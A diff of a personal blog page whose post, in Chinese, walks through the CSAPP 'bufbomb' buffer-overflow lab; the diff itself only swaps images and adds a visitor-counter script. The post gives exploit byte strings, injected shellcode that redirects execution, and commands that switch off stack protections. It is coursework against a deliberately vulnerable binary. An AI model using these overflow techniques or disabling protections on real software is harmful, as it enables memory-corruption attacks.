@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -42,6 +42,8 @@
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://dingfen.github.io/img/CSAPP/lab3/overflow.png">
   
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
   
   
   <title>深入理解计算机系统之缓冲区溢出炸弹实验 - 峰子的乐园</title>
@@ -84,7 +86,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"dingfen.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"dingfen.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/background.bmp","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -319,18 +321,18 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./bufbomb -t SA18xxxxxx &lt; exploit-raw.txt<br></code></pre></td></tr></table></figure>
 <h2 id="实验原理">实验原理</h2>
 <p>函数过程调用时的栈帧结构，见下图。</p>
-<p><img src="/img/CSAPP/lab3/overflow.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="/img/CSAPP/lab3/overflow.png" srcset="/img/background.bmp" lazyload alt=""></p>
 <p>注意，这张图的地址增长方向是向上。在x86架构上，Caller函数要在调用新函数前，准备好函数参数：传递的参数少于7个，就可以通过寄存器传递，当参数过多寄存器不够用时，就需要通过栈来传递。当Caller调用函数时，会将返回地址压入栈中，形成Caller的栈帧末尾。而被调用函数的栈帧就从保存帧指针的值开始。</p>
 <h2 id="实验开始">实验开始</h2>
 <h3 id="Level-0">Level 0</h3>
 <p>这一阶段要求，控制程序进入一个在正常情况下不会被调用的函数 <code>smoke()</code> 。首先看一下 <code>smoke()</code> 函数的内存位置，是 <code>0x08048e20</code> ：</p>
-<p><img src="/img/CSAPP/lab3/1.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="/img/CSAPP/lab3/1.png" srcset="/img/background.bmp" lazyload alt=""></p>
 <p>下图显示了在调用 <code>Gets()</code> 函数前，<code>getbuf()</code>  的栈帧情况（代码见前文）。</p>
-<p><img src="/img/CSAPP/lab3/7.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="/img/CSAPP/lab3/7.png" srcset="/img/background.bmp" lazyload alt=""></p>
 <p><code>Gets()</code> 函数接收 <code>buf</code> 的指针，因此这里是直接写入点，只要输入的字符超过 12 字节，就可以依次覆盖保存的 <code>%ebp</code> 的值和返回地址。我们将返回地址改为 <code>0x08048e20</code> 即可。注意，x86 是小端法。在 <code>exploit.txt</code> 中输入：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">41</span> <span class="hljs-number">42</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span> <span class="hljs-number">45</span> <span class="hljs-number">46</span> <span class="hljs-number">47</span> <span class="hljs-number">48</span> <span class="hljs-number">49</span> <span class="hljs-number">50</span> <span class="hljs-number">51</span> <span class="hljs-number">52</span> <span class="hljs-number">53</span> <span class="hljs-number">54</span> <span class="hljs-number">55</span> <span class="hljs-number">56</span> <span class="hljs-number">20</span> <span class="hljs-number">8</span>e <span class="hljs-number">04</span> <span class="hljs-number">08</span><br></code></pre></td></tr></table></figure>
 <p>修改完成后，生成 <code>exploit-raw.txt</code> 文本，输入，得到结果见下：</p>
-<p><img src="/img/CSAPP/lab3/3.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="/img/CSAPP/lab3/3.png" srcset="/img/background.bmp" lazyload alt=""></p>
 <h3 id="Level-1">Level 1</h3>
 <p>现在实验要求程序跳转到 <code>fizz()</code> ，并且打印出 <code>fizz()</code> 函数的参数，必须为自己的 Cookie 值，我的 Cookie 值为 <code>0x46dd0bfe</code> 。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fizz</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> &#123; <br>	entry_check(<span class="hljs-number">1</span>); <span class="hljs-comment">/* Make sure entered this function properly */</span> <br>	<span class="hljs-keyword">if</span> (val == cookie) &#123; <br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val); <br>		validate(<span class="hljs-number">1</span>); <br>	&#125; <span class="hljs-keyword">else</span> <br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val); <br>	<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>&#125;<br></code></pre></td></tr></table></figure>
@@ -338,17 +340,17 @@
 <p>但问题是，参数该怎么传入呢？先来看看 <code>fizz()</code> 怎么使用参数的：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nasm">fizz:<br>	push   %ebp<br>	mov    %esp,%ebp<br>	push   %ebx<br>	sub    $0x14,%esp<br>	mov    0x8(%ebp),%ebx 	; %ebx = (%ebp+0x8)<br>	movl   $0x1,(%esp)<br>	call   80489a0 &lt;entry_check&gt;<br>	cmp    0x804a1cc,%ebx ; compare with %ebx (0x804a1cc) maybe it is cookie<br>	je     8048e00 &lt;fizz+0x40&gt;<br></code></pre></td></tr></table></figure>
 <p>如果你熟悉 x86 汇编语言，很容易看出，<code>fizz()</code> 函数是从 <code>0x8(%ebp)</code> 取出。下图指出了程序运行的过程，<code>Getbuf()</code> 函数执行 <code>ret</code> 指令，将返回地址存到 <code>eip</code> 寄存器中，于是我们来到了 <code>fizz()</code> 函数，然后执行两个 <code>push</code> 命令，从图中可以清楚地看出参数的位置。</p>
-<p><img src="/img/CSAPP/lab3/8.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="/img/CSAPP/lab3/8.png" srcset="/img/background.bmp" lazyload alt=""></p>
 <p>于是，在后面加上几位数字，就可以到达实验目的。见下图：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">41</span> <span class="hljs-number">42</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span> <span class="hljs-number">45</span> <span class="hljs-number">46</span> <span class="hljs-number">47</span> <span class="hljs-number">48</span> <span class="hljs-number">49</span> <span class="hljs-number">50</span> <span class="hljs-number">51</span> <span class="hljs-number">52</span> <span class="hljs-number">53</span> <span class="hljs-number">54</span> <span class="hljs-number">55</span> <span class="hljs-number">56</span> c0 <span class="hljs-number">8</span>d <span class="hljs-number">04</span> <span class="hljs-number">08</span> <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">03</span> <span class="hljs-number">04</span> fe <span class="hljs-number">0</span>b dd <span class="hljs-number">46</span><br></code></pre></td></tr></table></figure>
-<p><img src="/img/CSAPP/lab3/4.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="/img/CSAPP/lab3/4.png" srcset="/img/background.bmp" lazyload alt=""></p>
 <h3 id="Level-2">Level 2</h3>
 <p>现在实验难度继续上升，要求程序跳转到 <code>bang()</code> 函数中，并且要求 <code>global_value==cookie</code> 这条分支。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> global_value = <span class="hljs-number">0</span>; <br><span class="hljs-type">void</span> <span class="hljs-title function_">bang</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> &#123; <br>	entry_check(<span class="hljs-number">2</span>); <span class="hljs-comment">/* Make sure entered this function properly */</span> <br>	<span class="hljs-keyword">if</span> (global_value == cookie) &#123; <br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value); <br>		validate(<span class="hljs-number">2</span>); <br>	&#125; <span class="hljs-keyword">else</span> <br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value); <br>	<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>&#125;<br></code></pre></td></tr></table></figure>
 <p>这意味着我们需要在程序执行过程中，更改 <code>global_value</code> 的值。跳转到 <code>bang()</code> 函数难度不大，将返回地址修改一下就行。那么，如何修改 <code>global_value</code> 的值呢？有点难度，我们先从汇编代码入手，找到 <code>global_value</code> 的存放地址吧！</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nasm">08048d60 bang:<br>	push   %ebp<br>	mov    %esp,%ebp<br>	sub    $0x8,%esp<br>	movl   $0x2,(%esp)<br>	call   80489a0 &lt;entry_check&gt;<br>	mov    0x804a1dc,%eax	; global_value<br>	cmp    0x804a1cc,%eax	; cookie<br>	je     8048da0 &lt;bang+0x40&gt;<br></code></pre></td></tr></table></figure>
 <p>从 GDB 调试器中，可以轻松地找到 <code>global_value</code> 的地址：</p>
-<p><img src="/img/CSAPP/lab3/5.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="/img/CSAPP/lab3/5.png" srcset="/img/background.bmp" lazyload alt=""></p>
 <p>现在，要想办法把这个变量的值变为我们的 cookie 。当然，可以直接在 GDB 调试器里写入，不过这样实验就失去意义了！修改全局变量就需要注入我们自己的代码，然后将返回地址篡改到攻击代码处执行，最后再执行 <code>ret</code> 返回到 <code>bang()</code>。</p>
 <p>什么样的攻击代码才能满足我们的要求？不难，只需要修改 <code>global_value</code> 的值就行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nasm">movl $0x46dd0bfe, 0x804a1dc<br></code></pre></td></tr></table></figure>
@@ -356,14 +358,14 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nasm">push $0x8048d60<br>ret<br></code></pre></td></tr></table></figure>
 <p>还有一个小问题，我们的攻击代码要放在哪里呢？我们只能掌控栈帧内存空间，虽然理论上说，这时我们已经可以指挥受害者干任何事情，但是这毕竟是一个实验，我不想把事情闹大，看起来也只有 <code>buf</code> 数组那边的空间比较合适。通过前两个实验的分析，<code>buf</code> 空间余留下16字节的空间，这应该够我们注入代码了！</p>
 <p>使用 gcc 和 objdump 把这三句话转化为二进制，然后数一数空间，诶嘿，正好16字节！</p>
-<p><img src="/img/CSAPP/lab3/9.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="/img/CSAPP/lab3/9.png" srcset="/img/background.bmp" lazyload alt=""></p>
 <p>然后，把得到的二进制指令，放入到前16个字节中，而返回地址应该要填 <code>buf[0]</code> 的地址，使用 GDB 调试器，可以知道 <code>ebp</code> 寄存器的值是 <code>0xffffb878</code> ，那么 <code>buf[0]</code> 的地址就是 <code>0xffffb878-0xc=0xffffb86c</code>，于是写入：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c7</span> <span class="hljs-number">05</span> dc a1 <span class="hljs-number">04</span> <span class="hljs-number">08</span> fe <span class="hljs-number">0</span>b dd <span class="hljs-number">46</span> <span class="hljs-number">68</span> <span class="hljs-number">60</span> <span class="hljs-number">8</span>d <span class="hljs-number">04</span> <span class="hljs-number">08</span> c3 <span class="hljs-number">6</span>c b8 ff ff<br></code></pre></td></tr></table></figure>
 <p>但是，如果你亲自实践的话，会发现这样仍然有错，程序不会跳转到你想要它去的地方，而是会发出 Segmentation Fault 这个令人烦恼的错误 :angry:。这是因为，Linux 为了防止缓冲区溢出攻击，已经将栈帧空间的代码可执行权限关闭了，如果将攻击代码放在栈帧区，也会因没有执行权限而无法运行。</p>
 <p>解决方法：安装execstack：<code>sudo apt-get install execstack</code>。然后，修改程序堆栈的可执行属性：<code>execstack -s bufbomb</code> 。如果拥有 <code>bufbomb</code> 的源代码，也可以在编译时关闭保护机制重新编译：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -g -z execstack -fno-stack-protector bufbomb.c -o bufbomb<br></code></pre></td></tr></table></figure>
 <p>另外，修改堆栈可执行属性只能在gdb调试下有效，实际运行仍然会出现段错误。所以，彻底解决的方法还是找到源代码以后重新编译。还要注意一点，多次实验时可能会出现缓冲区首地址改变的情况。经过短暂地调整后，实验成功！</p>
-<p><img src="/img/CSAPP/lab3/6.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="/img/CSAPP/lab3/6.png" srcset="/img/background.bmp" lazyload alt=""></p>
 <h3 id="Level-3">Level 3</h3>
 <p>最后一关，正常程序中 <code>test()</code> 返回后执行第 15 行代码，而我们要让函数执行第 12 行。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123; <br>	<span class="hljs-type">int</span> val; <br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> local = <span class="hljs-number">0xdeadbeef</span>; <br>    entry_check(<span class="hljs-number">3</span>); <span class="hljs-comment">/* Make sure entered this function properly */</span> <br>    val = getbuf(); <br>	<span class="hljs-comment">/* Check for corrupted stack */</span> <br>	<span class="hljs-keyword">if</span> (local != <span class="hljs-number">0xdeadbeef</span>) &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>); <br>	&#125; <br>	<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val == cookie) &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val); 	<span class="hljs-comment">// 12 行</span><br>        validate(<span class="hljs-number">3</span>); <br>    &#125; <br>   <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 15 行</span><br> 		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val); <br> 	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -371,10 +373,10 @@
 <p>我打算故技重施，直接插入攻击代码，先修改返回值为我的 cookie，再将正常返回地址压入栈，最后保持存放 <code>ebp</code> 值不变。攻击代码我已写好：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nasm">movl $0x46dd0bfe, %eax<br>push $0x0804901e<br>ret<br></code></pre></td></tr></table></figure>
 <p><code>0x0804901e</code> 值就是正常的返回地址，<code>call</code> 语句的下一条指令地址。</p>
-<p><img src="/img/CSAPP/lab3/10.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="/img/CSAPP/lab3/10.png" srcset="/img/background.bmp" lazyload alt=""></p>
 <p>​	仍用之前的办法将攻击指令转为二进制代码，这次代码长度变短，正好11个字节，再放入<code>0xffffb898</code> 和攻击代码的起始地址。大功告成：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b8</span> fe <span class="hljs-number">0</span>b dd <span class="hljs-number">46</span> <span class="hljs-number">68</span> <span class="hljs-number">1</span>e <span class="hljs-number">90</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">98</span> b8 ff ff <span class="hljs-number">6</span>c b8 ff ff<br></code></pre></td></tr></table></figure>
-<p><img src="/img/CSAPP/lab3/11.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="/img/CSAPP/lab3/11.png" srcset="/img/background.bmp" lazyload alt=""></p>
 
                 
               </div>
@@ -601,6 +603,30 @@
     </div>
   
   
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
   
   
 </div>
@@ -773,6 +799,8 @@
   <script>Fluid.plugins.imageCaption();</script>
 
   <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
